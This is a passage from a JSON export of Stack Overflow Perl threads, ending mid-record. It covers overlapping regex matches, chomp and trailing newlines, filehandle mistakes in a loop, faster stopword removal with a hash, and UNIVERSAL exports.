Thanks!</p>\n\n<p>[update with a solution]:\nWith help from colleagues, I identified a solution using the so-called \"look-around assertion\" afforded by Perl.  </p>\n\n<pre><code>#!/usr/bin/perl -w\n$str = \"t10_t20_t30_t40_\";\nwhile($str =~ m/(?=(t\\d+_t\\d+))/g)\n{print \"$1\\n\";}\n</code></pre>\n\n<p>The key is to use \"zero width look-ahead assertion\" in Perl.  When Perl (and other similar packages) uses regexp to scan a string, it does not re-scan what was already scanned in the last match.  So in the above example, t20_t30 will never show up in the results.  To capture that, we need to use a zero-width lookahead search to scan the string, producing matches that do not exclude any substrings from subsequent searches (see the working code above).  The search will start from zero-th position and increment by one as many times as possible if \"global\" modifier is appended to the search (i.e. m//g), making it a \"greedy\" search.  </p>\n\n<p>This is explained in more detail in <a href=\"http://linuxshellaccount.blogspot.com/2008/09/finding-overlapping-matches-using-perls.html\" rel=\"nofollow\">this blog post</a>.</p>\n\n<p>The expression (?=t\\d+_t\\d+) matches any 0-width string followed by t\\d+_t\\d+, and this creates the actual \"sliding window\".  This effectively returns ALL t\\d+_t\\d+ patterns in $str without any exclusion since every position in $str is a 0-width string.  The additional parenthesis captures the pattern while its doing sliding matching (?=(t\\d+_t\\d+)) and thus returns the desired sliding window outcome.  </p>\n"}, {"tags": ["macos", "perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1454935834, "post_id": 35261397, "comment_id": 58251326, "body": "Best just to reinstall it properly. Make sure env var <code>PERL_MM_OPT</code>, <code>PERL_MB_OPT</code> and <code>PERL5LIB</code> aren&#39;t set in the shell you&#39;ll use to install the module. Make sure <code>cpan</code> configuration vars <code>makepl_arg</code> and <code>mbuildpl_arg</code> are empty. (<code>echo &#39;o conf makepl_arg&#39; | cpan</code> and <code>echo &#39;o conf mbuildpl_arg&#39; | cpan</code> will show <code>[]</code> for them.)"}], "owner": {"reputation": 65, "user_id": 3802685, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/cd9359f1cd3e0e11697847f90f40428f?s=128&d=identicon&r=PG&f=1", "display_name": "user3802685", "link": "https://stackoverflow.com/users/3802685/user3802685"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 38, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1454896189, "creation_date": 1454896189, "question_id": 35261397, "link": "https://stackoverflow.com/questions/35261397/transferring-perl-modules-from-a-folder-to-the-pre-installed-perl-on-mac", "title": "Transferring Perl Modules from a folder, to the pre-installed perl on Mac", "body": "<p>Salutations </p>\n\n<p>I am having an issue right now. Recently I have download Bioperl, but I made a mistake somewhere in the installation process. I dont know the correct terminology, but what I do know is that the perl modules I downloaded are suppose to be with the default perl (aka #!/usr/bin/perl) along with the use strict, and use warnings.<br>\nBut they are located in this directory.    </p>\n\n<p>/Users/JamesPK/TerminalWork/lib/perl5/5.16.2/Bio/AlignIO/fasta.pm</p>\n\n<p>So right now, I need to transfer all those modules from bioperl in the home directoy, to where ever the  #!/usr/bin/perl is located. </p>\n\n<p>Anybody have any ideas or insights to tackling this problem ? \nPlus is there an effective unix command I can use for transfering these files?  I am still getting use to programming on a Mac. </p>\n\n<p>Cheers</p>\n"}, {"tags": ["regex", "perl", "newline"], "comments": [{"owner": {"reputation": 1205, "user_id": 4667934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hk11W.jpg?s=128&g=1", "display_name": "LinkBerest", "link": "https://stackoverflow.com/users/4667934/linkberest"}, "edited": false, "score": 0, "creation_date": 1454887503, "post_id": 35260386, "comment_id": 58233175, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/4597937/perl-function-to-trim-string-leading-and-trailing-whitespace\">Perl: function to trim string leading and trailing whitespace</a>"}, {"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "reply_to_user": {"reputation": 1205, "user_id": 4667934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hk11W.jpg?s=128&g=1", "display_name": "LinkBerest", "link": "https://stackoverflow.com/users/4667934/linkberest"}, "edited": false, "score": 0, "creation_date": 1454887570, "post_id": 35260386, "comment_id": 58233190, "body": "@JGreenwell How could it possibly be a duplicate?  I have given an extract of code that clearly contains an error pointed out by ruakh below."}, {"owner": {"reputation": 1205, "user_id": 4667934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hk11W.jpg?s=128&g=1", "display_name": "LinkBerest", "link": "https://stackoverflow.com/users/4667934/linkberest"}, "edited": false, "score": 0, "creation_date": 1454887688, "post_id": 35260386, "comment_id": 58233226, "body": "Because your actual question is how do I remove the trailing whitespace and the regex that answers your question is in the linked question&#39;s answers (also includes a note on chomp vs. regex)"}, {"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "reply_to_user": {"reputation": 1205, "user_id": 4667934, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hk11W.jpg?s=128&g=1", "display_name": "LinkBerest", "link": "https://stackoverflow.com/users/4667934/linkberest"}, "edited": false, "score": 1, "creation_date": 1454887813, "post_id": 35260386, "comment_id": 58233261, "body": "@JGreenwell That is not the question I asked.  I asked a question about a specific extract of code which was answered."}], "answers": [{"comments": [{"owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "reply_to_user": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 5, "creation_date": 1454887286, "post_id": 35260432, "comment_id": 58233122, "body": "@CJ7: That&#39;s . . . not a very helpful statement. I mean, obviously <code>chomp</code> works. It&#39;s not like it&#39;s been broken this whole time and no one has ever noticed. If you&#39;re having difficulty with it, you need to provide more information about how you&#39;re using it and what&#39;s going wrong."}, {"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1454887355, "post_id": 35260432, "comment_id": 58233138, "body": "I used <code>chomp $line</code> instead of the regex line above and it still outputted all the newlines."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1454893422, "post_id": 35260432, "comment_id": 58234426, "body": "@CJ7 Then either you changed the input record separator <code>$&#47;</code> from the default, or your lines don&#39;t end in <code>$&#47;</code>. To test, add <code>use Data::Dumper; $Data::Dumper::Useqq = 1; print Dumper $line;</code>"}, {"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1454900220, "post_id": 35260432, "comment_id": 58235569, "body": "@ThisSuitIsBlackNot <code>chomp</code> doesn&#39;t remove carriage return characters"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 1, "creation_date": 1454900925, "post_id": 35260432, "comment_id": 58235651, "body": "@CJ7 Actually <a href=\"http://perldoc.perl.org/perlport.html#Newlines\" rel=\"nofollow noreferrer\">it does if you&#39;re running on Windows</a> or if you change the value of <code>$&#47;</code>. If you&#39;re running on *nix but your file has Windows line endings, you have to either change <code>$&#47;</code> before you <code>chomp</code> or use the regex ruakh showed."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1454925563, "post_id": 35260432, "comment_id": 58244898, "body": "@ThisSuitIsBlackNot: <code>$&#47;</code> is set to <code>&quot;\\n&quot;</code> by default on every platform. PerlIO changes the line endings to a simple newline on input, but if you use <code>chomp</code> on a string that ends in <code>&quot;\\r\\n&quot;</code> then you will be left with a carriage return, even on Windows"}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1454944954, "post_id": 35260432, "comment_id": 58257738, "body": "@Borodin Ah, I misunderstood that bit. Thanks for the explanation."}], "tags": [], "owner": {"reputation": 155387, "user_id": 978917, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/92d059913eace78a868a3e87f98e0a57?s=128&d=identicon&r=PG", "display_name": "ruakh", "link": "https://stackoverflow.com/users/978917/ruakh"}, "is_accepted": true, "score": 2, "last_activity_date": 1454887208, "last_edit_date": 1454887208, "creation_date": 1454887156, "answer_id": 35260432, "question_id": 35260386, "link": "https://stackoverflow.com/questions/35260386/why-am-i-still-getting-newlines/35260432#35260432", "title": "Why am I still getting newlines?", "body": "<p><code>/\\s+^/</code> means \"one or more whitespace characters <em>before</em> the <em>start</em> of the string\" &mdash; so it will never match.</p>\n\n<p>If your goal is to remove <em>trailing</em> whitespace characters, then you need <code>$</code> rather than <code>^</code>:</p>\n\n<pre><code>    $line =~  s/\\s+$//;\n</code></pre>\n\n<p>(And if your goal is really just to remove the trailing newline, then you should probably use <a href=\"http://perldoc.perl.org/functions/chomp.html\" rel=\"nofollow\">the built-in <code>chomp</code> function</a>.)</p>\n"}], "owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 85, "favorite_count": 0, "accepted_answer_id": 35260432, "answer_count": 1, "score": -1, "last_activity_date": 1454901078, "creation_date": 1454886862, "question_id": 35260386, "link": "https://stackoverflow.com/questions/35260386/why-am-i-still-getting-newlines", "title": "Why am I still getting newlines?", "body": "<p>I have the following code:</p>\n\n<pre><code>open INPUT, \"input.txt\";\nmy $line = \"\";\nwhile (&lt;INPUT&gt;)\n{\n        $line = $_;\n        $line =~  s/\\s+^//;\n        print $line;\n}\n</code></pre>\n\n<p>But the output still includes all the newlines.  I have also tried <code>\\v</code> and <code>\\R</code>.</p>\n"}, {"tags": ["arrays", "regex", "perl", "foreach"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454889863, "post_id": 35259822, "comment_id": 58233743, "body": "<code>close $file</code> won&#39;t be working."}], "answers": [{"comments": [{"owner": {"reputation": 165, "user_id": 5880355, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/b78c85bb76849376873b8e1556d3000d?s=128&d=identicon&r=PG&f=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/5880355/rob"}, "edited": false, "score": 0, "creation_date": 1454909071, "post_id": 35261014, "comment_id": 58237493, "body": "Unfortunately, even after experimenting with all your answers, I still am only able to read in, operate on, and print one file out of the directory of files. I should at least be able to add all of the contents of the files in turn to an array and then print them out. Playing with the close statement didn&#39;t help with this. At minimum the following code should be functional, but isn&#39;t: foreach my $file (@ArrayofFiles) { open (my $sequence, &#39;&lt;&#39;, $file) or die $!; while (my $line = &lt;$sequence&gt;){ chomp($line); push(@TrimmedSequences, $line); }} print @trimmedSequences, &quot;\\n&quot;;"}, {"owner": {"reputation": 1769, "user_id": 1893692, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e17d1edf681b1f6bc512b2d95c4256b9?s=128&d=identicon&r=PG&f=1", "display_name": "Gabs00", "link": "https://stackoverflow.com/users/1893692/gabs00"}, "reply_to_user": {"reputation": 165, "user_id": 5880355, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/b78c85bb76849376873b8e1556d3000d?s=128&d=identicon&r=PG&f=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/5880355/rob"}, "edited": false, "score": 0, "creation_date": 1454945087, "post_id": 35261014, "comment_id": 58257842, "body": "@Rob try making a script with the minimal amount of code needed to print all lines from one of the files. Sounds like it isn&#39;t so much a problem with this block of code, maybe there is something elsewhere in your code, or something to do with the files you&#39;re trying to parse"}], "tags": [], "owner": {"reputation": 957, "user_id": 201318, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iwp4j.png?s=128&g=1", "display_name": "kba", "link": "https://stackoverflow.com/users/201318/kba"}, "is_accepted": false, "score": 0, "last_activity_date": 1454892479, "creation_date": 1454892479, "answer_id": 35261014, "question_id": 35259822, "link": "https://stackoverflow.com/questions/35259822/foreach-loop-only-acting-on-a-portion-of-the-first-element-in-an-array/35261014#35261014", "title": "Foreach loop only acting on a portion of the first element in an array", "body": "<p>You are calling close on the wrong variable <code>$file</code> (filename, a string) instead of <code>$sequence</code> (the filehandle of the file).</p>\n\n<p>Also, the <code>close</code> call is in the wrong place, you are closing the filehandle in the middle of the read loop. If you really intended to find only the first matching line in each file, close the filehandle and break (<code>last</code>) out of the while loop. If you want to find all matching lines in all files:</p>\n\n<pre><code>foreach my $file (@ArrayofFiles){ \n    open (my $sequence, '&lt;', $file) or die $!;\n    while (my $line = &lt;$sequence&gt;) {  \n        $line =~ s/\\R//g;\n        if ($line =~ m/(CTCCCA)[TAGC]+(TCAGGA)/) {\n            push(@TrimmedSequences, $line);\n        }\n    }\n    close $sequence or die $!; \n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1769, "user_id": 1893692, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e17d1edf681b1f6bc512b2d95c4256b9?s=128&d=identicon&r=PG&f=1", "display_name": "Gabs00", "link": "https://stackoverflow.com/users/1893692/gabs00"}, "is_accepted": true, "score": 2, "last_activity_date": 1454895647, "creation_date": 1454895647, "answer_id": 35261348, "question_id": 35259822, "link": "https://stackoverflow.com/questions/35259822/foreach-loop-only-acting-on-a-portion-of-the-first-element-in-an-array/35261348#35261348", "title": "Foreach loop only acting on a portion of the first element in an array", "body": "<p>Testing your code (or similar to it) works fine when removing the close statement. Using the close breaks the loop as soon as it finds a match. Leaving only one result per file.</p>\n\n<p>Also note, you don't need to call close at all. The file will be closed when the variable $sequence loses scope.</p>\n\n<p><code>chomp</code> should be used to get rid of newlines</p>\n\n<p>Here is my test code. note a few edits.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $files = (\".\");\n\nmy @files = grep { $_ =~ /\\.pl/} glob \"$files/*\"; #added to filter out the directies in test directory, can be ignored\nmy @lines;\n\n#use for in perl not foreach\nfor my $file (@files){\n  open my $fh, '&lt;', $file or die $!;\n  while(my $line = &lt;$fh&gt;){\n    chomp($line); #Use chomp to remove newlines\n    if($line =~ /use/){\n      push @lines, $line; #no need to call close at all, the filehandle is closed when it loses scope\n    }\n  }\n}\n\nprint join(\"\\n\", @lines) . \"\\n\";\n</code></pre>\n\n<p>Does as expected in my test directory and prints all the use statements from the perl files I have in the directory.</p>\n"}], "owner": {"reputation": 165, "user_id": 5880355, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/b78c85bb76849376873b8e1556d3000d?s=128&d=identicon&r=PG&f=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/5880355/rob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 144, "favorite_count": 0, "accepted_answer_id": 35261348, "answer_count": 2, "score": 0, "last_activity_date": 1454895647, "creation_date": 1454883345, "last_edit_date": 1454883889, "question_id": 35259822, "link": "https://stackoverflow.com/questions/35259822/foreach-loop-only-acting-on-a-portion-of-the-first-element-in-an-array", "title": "Foreach loop only acting on a portion of the first element in an array", "body": "<p>I have five fasta files in a directory, which I can successfully put into an array. When I attempt to open all the files in succession via a foreach loop, to perform a regex on each file, only the first file in the directory seems to open for processing. Furthermore, when I try to print the entire sequence in the first file (via a diagnostic print statement not shown), the first half of the sequence is ignored. Only the latter portion of the sequence is printed. If anyone has insights on how to overcome this, I would be very grateful. Here is what my code looks like so far.</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings; \nuse strict;\nuse diagnostics; \n\nmy $dir = (\"/Users/roblogan/Documents/FakeFastaFilesAgain\");  \nmy @TrimmedSequences; \n\nmy @ArrayofFiles = glob \"$dir/*\"; \n\n#print join(\"\\n\", @ArrayofFiles), \"\\n\";      # this is a diagnostic test print statement\n\nforeach my $file (@ArrayofFiles){ \n    open (my $sequence, '&lt;', $file) or die $!; # open each file in the array\n    while (my $line = &lt;$sequence&gt;) {  \n        $line =~ s/\\R//g;                          # get rid of new line breaks\n        if ($line =~ m/(CTCCCA)[TAGC]+(TCAGGA)/) { # search file contents \n            push(@TrimmedSequences, $line);        # push the match into another array \n            close $file; \n        }\n    }\n}   \n\nprint join(\"\\n\", @TrimmedSequences), \"\\n\"; \n</code></pre>\n"}, {"tags": ["algorithm", "perl", "optimization", "stop-words"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 3, "creation_date": 1454881625, "post_id": 35259416, "comment_id": 58231373, "body": "<code>@stops = &lt;STOPWORD&gt;</code> reads the full file. <code>while (&lt;STOPWPRD&gt;)</code> is therefore skipped, as there&#39;s nothing else to read. <code>%stops = @stops</code> creates keys from the odd stopwords, and values from the even. Is it really what you want?"}, {"owner": {"reputation": 175, "user_id": 5186623, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/10206691161224996/picture?type=large", "display_name": "Chedi Bechikh", "link": "https://stackoverflow.com/users/5186623/chedi-bechikh"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1454882268, "post_id": 35259416, "comment_id": 58231566, "body": "no these are mistakes, must be corrected, i only want to read the file that contains stopwrods, the words contained in @stop must be eliminated from the file FILE"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 2, "creation_date": 1454882592, "post_id": 35259416, "comment_id": 58231641, "body": "There&#39;s no point in optimising code that doesn&#39;t run correctly."}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454882853, "post_id": 35259416, "comment_id": 58231728, "body": "But you really want to look at perlre."}, {"owner": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 1, "creation_date": 1454882978, "post_id": 35259416, "comment_id": 58231773, "body": "As horrendous as this code is, it should mostly... kind of... sort of work. How big are your files, and how long is the program running?"}, {"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1454883298, "post_id": 35259416, "comment_id": 58231895, "body": "Also: some sample input and output."}, {"owner": {"reputation": 175, "user_id": 5186623, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/10206691161224996/picture?type=large", "display_name": "Chedi Bechikh", "link": "https://stackoverflow.com/users/5186623/chedi-bechikh"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1454919507, "post_id": 35259416, "comment_id": 58241560, "body": "@choroba: sorry but the code work and it eliminates stopword, why you said this dosen&#39;t work!!! justify !! waht you said is incorrect"}, {"owner": {"reputation": 175, "user_id": 5186623, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/10206691161224996/picture?type=large", "display_name": "Chedi Bechikh", "link": "https://stackoverflow.com/users/5186623/chedi-bechikh"}, "reply_to_user": {"reputation": 6258, "user_id": 82262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8ce15931410b388a52eb2df4a864137f?s=128&d=identicon&r=PG&f=1", "display_name": "Matt Jacob", "link": "https://stackoverflow.com/users/82262/matt-jacob"}, "edited": false, "score": 0, "creation_date": 1454919574, "post_id": 35259416, "comment_id": 58241592, "body": "@MattJacob: the files are not very big 2Mo ,and 500ko , the code take many hours but not finished yet"}], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": true, "score": 1, "last_activity_date": 1454922528, "creation_date": 1454922528, "answer_id": 35265807, "question_id": 35259416, "link": "https://stackoverflow.com/questions/35259416/how-to-optimise-a-code-to-eliminate-stopwords-from-a-text-perl/35265807#35265807", "title": "How to optimise a code to eliminate stopwords from a text Perl", "body": "<p>The main reason why your code is slow is because it loops over the array of stopwords for each word in the input. The standard approach here would be to use a hash of stopwords rather than the array.</p>\n\n<p>Also, it's much clearer to chomp the whole array once you're sure no new elements are coming to it, rather then chomping its elements again and again.</p>\n\n<p>As noted in the comments, whe <code>while (&lt;STOPWORDS&gt;)</code> loop doesn't execute, as you exhaust the filehandle by reading from it in list context on the previous line.</p>\n\n<p>You haven't provided example input. If you want to exclude stopwords from a file of words, it's OK, but if you want to process a real text, you'll have to do more work to find the occurrences of the stopwords: they can have different case, and they aren't separated by whitespace only, there's punctuation, too.</p>\n\n<p>You can start from here:</p>\n\n<pre><code>#!/usr/bin/perl\nuse warnings;\nuse strict;\n\nopen my $STOP, 'stop-ats' or die \"Can't Open: $!\\n\";\nmy %stops;\nwhile (&lt;$STOP&gt;) {\n    chomp;\n    $stops{$_} = 1;\n}\n\nopen my $TEXT, '&lt;', 'ats' or die \"Cannot open FILE: $!\";\nwhile (&lt;$TEXT&gt;) {\n    my @words = split /([[:alpha:]]+)/;\n    for my $word (@words) {\n        print $word unless $stops{ lc $word };\n    }\n}\n</code></pre>\n"}], "owner": {"reputation": 175, "user_id": 5186623, "user_type": "registered", "accept_rate": 33, "profile_image": "https://graph.facebook.com/10206691161224996/picture?type=large", "display_name": "Chedi Bechikh", "link": "https://stackoverflow.com/users/5186623/chedi-bechikh"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 210, "favorite_count": 0, "accepted_answer_id": 35265807, "answer_count": 1, "score": -2, "last_activity_date": 1454922528, "creation_date": 1454881024, "last_edit_date": 1454882327, "question_id": 35259416, "link": "https://stackoverflow.com/questions/35259416/how-to-optimise-a-code-to-eliminate-stopwords-from-a-text-perl", "title": "How to optimise a code to eliminate stopwords from a text Perl", "body": "<p>I have a code that read a Text file and a file that contain stopword list, but this code take a great time in the execution, how to optimise this code?</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nprint \"choose the name of the result file\\n\";\nmy $fic = &lt;STDIN&gt;;\n\nopen( FIC1, \"&gt;$fic\" );\n\nmy @stops;\nmy @file;\n\nuse File::Copy;\n\nopen( STOPWORD, \"C:\\\\ats\\\\stop-ats\" ) or die \"Can't Open: $!\\n\";\n\n@stops = &lt;STOPWORD&gt;;\nwhile (&lt;STOPWORD&gt;)    #read each line into $_\n{\n    chomp @stops;     # Remove newline from $_\n    push @stops, $_;  # add the line to @triggers\n}\n\n\n\nclose STOPWORD;\n\nopen( FILE, \"C:\\\\ats\\\\ats\" ) or die \"Cannot open FILE\";\n\nwhile (&lt;FILE&gt;) {\n    $line = $_;\n\n    #print  $line;\n    my @words = split( /\\s/, $line );\n    foreach $word (@words) {\n        chomp($word);\n        foreach $wor (@stops) {\n            chomp($wor);\n            if ( $word eq $wor ) {\n\n                #print   \"$wor\\n\";\n                $word = '';\n\n            }\n        }\n\n        print FIC1 $word;\n        print FIC1 \" \";\n\n    }\n    print FIC1 \"\\n\";\n}\nexit 0;\n</code></pre>\n\n<p>The code take a very long time to process a text file , how to optimise this code</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "is_accepted": false, "score": 3, "last_activity_date": 1454880063, "creation_date": 1454880063, "answer_id": 35259255, "question_id": 35258993, "link": "https://stackoverflow.com/questions/35258993/perl-universal-does-not-export-anything/35259255#35259255", "title": "perl - UNIVERSAL does not export anything", "body": "<p>Older versions of <a href=\"http://p3rl.org/UNIVERSAL\" rel=\"nofollow\">UNIVERSAL</a> say</p>\n\n<blockquote>\n  <p>You may request the import of three functions (<code>isa</code>, <code>can</code>, and <code>VERSION</code>), but this feature is deprecated and will be removed.\n      Please don't do this in new code.</p>\n</blockquote>\n\n<p>The latest version just says</p>\n\n<blockquote>\n  <p>EXPORTS</p>\n  \n  <p>None.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 6592, "user_id": 3005251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a5331f7e467aae3d581fe8bc814ef572?s=128&d=identicon&r=PG", "display_name": "bolav", "link": "https://stackoverflow.com/users/3005251/bolav"}, "is_accepted": true, "score": 2, "last_activity_date": 1454880093, "creation_date": 1454880093, "answer_id": 35259262, "question_id": 35258993, "link": 